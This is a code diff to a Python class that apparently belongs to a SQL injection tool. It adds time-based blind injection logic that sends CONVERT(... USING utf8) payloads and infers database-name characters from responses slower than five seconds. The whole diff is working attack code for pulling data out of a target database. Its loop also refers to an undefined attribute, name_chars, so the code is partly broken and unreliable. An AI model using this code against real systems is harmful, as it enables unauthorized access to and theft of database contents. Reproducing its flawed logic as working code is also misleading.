@@ -86,7 +86,7 @@ class BaseInjection(HTTPrequest):
         super().__init__(url, header, data)
         self.CHAR_SET = config.Characters.ALL_CHARS.value
         self.payload = None
-        self.database_name_chars = None
+        self.database_name_chars = []
 
     def get_version(self):
         pass
@@ -123,7 +123,32 @@ class BaseInjection(HTTPrequest):
             self.total_time = self.time_finish - self.time_start
             if(self.total_time > 5):
                 print('Character found: ', char, ' ... in response time of', self.total_time)
+                self.database_name_chars.append(char)
 
+    def _find_database_names(self, query):
+        """ Iterate over known characters to find database names. """
+        self.char_found = True
+        index = 0
+        self.multiple_convert = ''
+        self.test_convert = ''
+        char_found_index = 0
+        while(self.char_found):
+            for char in self.database_name_chars:
+                self.payload = self.url + query
+                self.single_convert = 'CONVERT({} USING utf8), '.format(hex(ord(char)))
+                self.test_convert = self.test_convert + self.single_convert
+                self.time_start = time.time()
+                self.res = self.send_request(self.payload.format(self.test_convert))
+                self.time_finish = time.time()
+                self.total_time = self.time_finish - self.time_start
+                if(self.total_time > 5):
+                    self.multiple_convert = self.multiple_convert + self.test_convert
+                    print(char)
+                else:
+                    self.test_convert = self.multiple_convert
+                    char_found_index = char_found_index + 1
+            if(char_found_index == len(self.name_chars)):
+                self.char_found = False
 ###### MySQL ######
 
 class MySQLunion(BaseInjection):
